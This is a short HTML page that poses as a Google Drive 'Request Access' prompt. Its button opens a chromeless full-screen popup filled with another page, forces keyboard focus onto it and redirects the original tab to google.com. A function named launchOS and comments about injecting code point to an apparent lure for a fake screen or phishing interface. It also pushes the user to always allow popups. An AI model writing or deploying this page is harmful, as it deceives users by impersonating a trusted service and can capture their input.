<!DOCTYPE html>
<html>
<head>
    <title>Google Drive - Request Access</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container">
        <p>You need permission to access this document.</p>
        <button class="btn" onclick="launchOS()">Request Access</button>
    </div>

    <script>
        function launchOS() {
            fetch('index.html')
                .then(r => r.text())
                .then(html => {
                    const features = `menubar=no,toolbar=no,location=no,status=no,width=${screen.availWidth},height=${screen.availHeight}`;
                    const win = window.open("about:blank", "_blank", features);
                    
                    if (win) {
                        // This part injects the code
                        win.document.open();
                        win.document.write(html);
                        win.document.close();
                        
                        // NEW: This forces the window to pay attention to your keyboard
                        setTimeout(() => {
                            win.focus();
                        }, 500);

                        window.location.replace("https://www.google.com");
                    } else {
                        alert("Popup blocked! Click the icon in the address bar to 'Always Allow'.");
                    }
                });
        }
    </script>
</body>
</html>
